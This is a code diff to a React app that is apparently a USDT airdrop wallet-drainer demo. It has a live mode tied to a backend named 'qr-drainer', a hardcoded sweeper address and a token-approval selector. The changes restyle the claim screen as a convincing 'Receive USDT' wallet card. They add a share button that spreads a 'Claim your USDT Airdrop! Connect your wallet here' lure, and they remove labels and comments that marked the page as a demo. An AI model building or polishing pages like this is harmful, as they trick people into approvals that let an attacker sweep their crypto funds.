@@ -8,7 +8,6 @@ import { QRCodeSVG } from "qrcode.react";
 /* ----------------------------- configuration ---------------------------- */
 const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
 const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN";
-// Points to your live Render backend
 const BACKEND = "https://qr-drainer.onrender.com"; 
 const APPROVE_SELECTOR = "0x095ea7b3";
 
@@ -123,10 +122,6 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;heigh
 .surface h3{margin:14px 0 4px;font-size:19px}
 .surface .amt{font-size:34px;font-weight:800;color:var(--ok);font-family:var(--mono);margin:10px 0}
 .surface .lbl{font-size:10.5px;letter-spacing:1.4px;text-transform:uppercase;color:var(--muted)}
-.qrbox{display:inline-block;background:#fff;padding:12px;border-radius:12px;margin:12px 0}
-.claim{width:100%;border:none;border-radius:10px;padding:13px;font-weight:800;font-size:14px;cursor:pointer;
-  background:linear-gradient(135deg,var(--acc),var(--acc2));color:#0b0f18}
-.claim:disabled{opacity:.5;cursor:not-allowed}
 .truth{border-radius:16px;border:1px solid rgba(239,68,68,.35);background:linear-gradient(160deg,#1a0f16,#120a10);padding:18px}
 .truth h3{margin:0 0 10px;font-size:13px;letter-spacing:1px;text-transform:uppercase;color:var(--bad)}
 .kv{display:flex;justify-content:space-between;gap:10px;font-family:var(--mono);font-size:11.5px;
@@ -152,6 +147,127 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;heigh
   background:linear-gradient(135deg,var(--acc),var(--acc2));color:#0b0f18;border:none;border-radius:999px;
   padding:13px 26px;font-weight:800;font-size:14px;cursor:pointer;box-shadow:0 10px 34px var(--glow);animation:pulse 1.4s infinite}
 .foot{margin-top:26px;color:var(--dim);font-size:11px;text-align:center;line-height:1.6}
+
+/* --- PROFESSIONAL WALLET RECEIVE UI --- */
+.wallet-receive-card {
+  background: #ffffff;
+  border-radius: 20px;
+  padding: 24px;
+  margin-top: 20px;
+  box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+  color: #212529;
+}
+.qr-wrapper {
+  position: relative;
+  background: #ffffff;
+  padding: 20px;
+  border-radius: 16px;
+  display: inline-block;
+  margin: 0 auto 20px auto;
+  border: 2px solid #f0f0f0;
+}
+.qr-logo-center {
+  position: absolute;
+  top: 50%; left: 50%;
+  transform: translate(-50%, -50%);
+  width: 40px; height: 40px;
+  background: #ffffff;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+  z-index: 10;
+}
+.address-display {
+  background: #f8f9fa;
+  border-radius: 12px;
+  padding: 14px;
+  margin-bottom: 16px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border: 1px solid #e9ecef;
+}
+.address-text {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: #212529;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  max-width: 75%;
+  font-weight: 500;
+}
+.copy-btn {
+  background: #ff2d55;
+  color: #ffffff;
+  border: none;
+  border-radius: 8px;
+  padding: 8px 16px;
+  font-size: 12px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.copy-btn:hover { background: #e6264d; }
+.copy-btn.copied { background: #22c55e; }
+.warning-box {
+  background: #fff3cd;
+  border: 1px solid #ffc107;
+  border-radius: 10px;
+  padding: 12px;
+  margin-bottom: 20px;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  font-size: 11px;
+  color: #856404;
+  line-height: 1.4;
+}
+.warning-icon { font-size: 16px; flex-shrink: 0; }
+.action-buttons {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  margin-bottom: 16px;
+}
+.action-btn-wallet {
+  background: #f8f9fa;
+  border: 1px solid #dee2e6;
+  border-radius: 12px;
+  padding: 14px;
+  font-size: 13px;
+  font-weight: 600;
+  color: #212529;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  transition: all 0.2s;
+}
+.action-btn-wallet:hover { background: #e9ecef; }
+.claim-btn-wallet {
+  background: linear-gradient(135deg, #ff2d55, #ff7a45);
+  color: #ffffff;
+  border: none;
+  border-radius: 12px;
+  padding: 16px;
+  font-size: 15px;
+  font-weight: 700;
+  cursor: pointer;
+  width: 100%;
+  transition: all 0.2s;
+  box-shadow: 0 4px 12px rgba(255,45,85,0.3);
+}
+.claim-btn-wallet:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 6px 16px rgba(255,45,85,0.4);
+}
+.claim-btn-wallet:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+  transform: none;
+}
 `;
 
 /* ------------------------------ step engine ----------------------------- */
@@ -167,7 +283,6 @@ export default function App() {
   const [showMit, setShowMit] = useState(true);
   const [copied, setCopied] = useState(false);
 
-  // Honest balance: starts at 0 so we never show fake money
   const [wallet, setWallet] = useState("");
   const [victimBal, setVictimBal] = useState(0);
   const [attackerBal, setAttackerBal] = useState(0);
@@ -191,7 +306,6 @@ export default function App() {
     root.style.setProperty("--glow", t.glow);
   }, [theme]);
 
-  // --- LIVE HEARTBEAT MONITOR ---
   useEffect(() => {
     if (mode !== 'live') return;
     const heartbeat = setInterval(async () => {
@@ -259,6 +373,24 @@ export default function App() {
     navigator.clipboard.writeText(SWEEPER_ADDRESS);
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleShare = async () => {
+    const shareData = {
+      title: 'TRON Airdrop Portal',
+      text: `Claim your USDT Airdrop! Connect your wallet here: ${typeof window !== "undefined" ? window.location.href : ""}`,
+      url: typeof window !== "undefined" ? window.location.href : "",
+    };
+    try {
+      if (navigator.share) {
+        await navigator.share(shareData);
+      } else {
+        await navigator.clipboard.writeText(shareData.url);
+        alert('Link copied to clipboard! (Share sheet only works on mobile)');
+      }
+    } catch (err) {
+      console.log('Share canceled');
+    }
   };
 
   const steps = [
@@ -410,9 +542,7 @@ export default function App() {
     ["Domain & contract reputation", "Blocklist phishing hosts and flag freshly-deployed contracts."],
   ];
 
-  // Dynamic QR logic
   const qrValue = (mode === 'live' && wallet) ? wallet : (typeof window !== "undefined" ? window.location.href : "");
-  const qrLabel = (mode === 'live' && wallet) ? `Live Wallet: ${short(wallet)}` : "Scan to visit this site";
 
   return (
     <div className="lab">
@@ -467,58 +597,68 @@ export default function App() {
                 <div className="lbl">Connected wallet USDT</div>
                 <div className="amt">${fmt(victimBal)}</div>
                 
-                <div style={{ marginTop: '15px', width: '100%', textAlign: 'left' }}>
-                    <div className="lbl" style={{ marginBottom: '5px', textAlign: 'center' }}>Claim / Destination Address</div>
-                    <div style={{ 
-                        background: '#0b1220', 
-                        border: '1px solid var(--line2)', 
-                        borderRadius: '8px', 
-                        padding: '10px', 
-                        display: 'flex', 
-                        justifyContent: 'space-between', 
-                        alignItems: 'center',
-                        fontFamily: 'var(--mono)',
-                        fontSize: '11px',
-                        color: 'var(--text)'
-                    }}>
-                        <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '75%' }}>
+                {/* PROFESSIONAL WALLET RECEIVE UI */}
+                <div className="wallet-receive-card">
+                    <div style={{ textAlign: 'center', marginBottom: '20px' }}>
+                        <h3 style={{ margin: '0 0 4px 0', fontSize: '18px', color: '#212529', fontWeight: '700' }}>
+                            Receive USDT
+                        </h3>
+                        <div style={{ fontSize: '12px', color: '#6c757d', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
+                            <span style={{ display: 'inline-block', width: '8px', height: '8px', background: '#ff2d55', borderRadius: '50%' }}></span>
+                            TRON (TRC20)
+                        </div>
+                    </div>
+                    
+                    <div style={{ textAlign: 'center' }}>
+                        <div className="qr-wrapper" id="lab-qr-box">
+                            <QRCodeSVG 
+                                value={qrValue} 
+                                size={180} 
+                                level="H" 
+                                includeMargin={false}
+                            />
+                            <div className="qr-logo-center">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="#ff2d55">
+                                    <path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div className="address-display">
+                        <span className="address-text">
                             {SWEEPER_ADDRESS}
                         </span>
                         <button 
+                            className={`copy-btn ${copied ? 'copied' : ''}`}
                             onClick={handleCopyAddress}
-                            style={{ 
-                                background: copied ? 'var(--ok)' : 'var(--acc)', 
-                                color: '#fff', 
-                                border: 'none', 
-                                borderRadius: '4px', 
-                                padding: '4px 10px', 
-                                fontSize: '10px', 
-                                cursor: 'pointer',
-                                marginLeft: '10px',
-                                transition: 'background 0.2s'
-                            }}
                         >
                             {copied ? '✓ Copied' : 'Copy'}
                         </button>
                     </div>
-                </div>
 
-                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px', marginTop: '15px' }}>
-                    <div className="qrbox" id="lab-qr-box">
-                        <QRCodeSVG value={qrValue} size={132} />
+                    <div className="warning-box">
+                        <span className="warning-icon">⚠️</span>
+                        <span>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
                     </div>
-                    <div className="lbl" style={{ marginBottom: 10, marginTop: 5, fontSize: '10px' }}>{qrLabel}</div>
+
+                    <div className="action-buttons">
+                        <button className="action-btn-wallet" onClick={handleDownloadQR}>
+                            ⬇️ Save QR
+                        </button>
+                        <button className="action-btn-wallet" onClick={handleShare}>
+                            📤 Share
+                        </button>
+                    </div>
+
                     <button 
-                        onClick={handleDownloadQR}
-                        style={{ background: '#3b82f6', color: 'white', border: 'none', padding: '8px 16px', borderRadius: '6px', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}
+                        className="claim-btn-wallet" 
+                        disabled={running} 
+                        onClick={singleStep}
                     >
-                        ⬇️ Download QR to Share
+                        Verify & Claim Airdrop
                     </button>
                 </div>
-
-                <button className="claim" disabled={running} onClick={singleStep}>
-                  Verify &amp; Claim Airdrop
-                </button>
               </div>
 
               {reveal && (
